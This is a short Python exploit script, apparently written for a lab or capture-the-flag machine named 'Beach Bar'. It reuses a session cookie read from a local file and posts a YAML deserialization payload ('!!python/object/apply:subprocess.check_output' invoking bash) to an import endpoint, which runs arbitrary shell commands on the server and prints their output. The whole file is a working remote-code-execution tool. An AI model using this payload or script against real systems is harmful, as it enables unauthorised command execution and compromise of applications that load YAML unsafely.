#!/usr/bin/env python3
"""RCE helper for Beach Bar - runs commands via YAML deserialization"""
import sys, html, re, urllib.request, urllib.parse

def load_cookie():
    for line in open("/tmp/dj_cookies.txt"):
        if "session" in line:
            return line.strip().split("\t")[-1]
    return None

COOKIE = load_cookie()
URL = "http://10.10.10.10/import"

def run(cmd):
    payload = '!!python/object/apply:subprocess.check_output [["/bin/bash","-c","%s"]]' % cmd
    data = urllib.parse.urlencode({"playlist": payload}).encode()
    req = urllib.request.Request(URL, data=data, headers={"Cookie": "session=" + COOKIE})
    resp = urllib.request.urlopen(req, timeout=20).read().decode(errors="replace")
    ms = re.findall(r"<pre>(.*?)</pre>", resp, re.DOTALL)
    for m in ms:
        print(html.unescape(m).strip())
    ms2 = re.findall(r"Could not load.*?</p>", resp, re.DOTALL)
    for m in ms2:
        print("ERR:", html.unescape(re.sub(r"<[^>]*>", "", m)).strip())

if __name__ == "__main__":
    cmd = sys.argv[1]
    run(cmd)
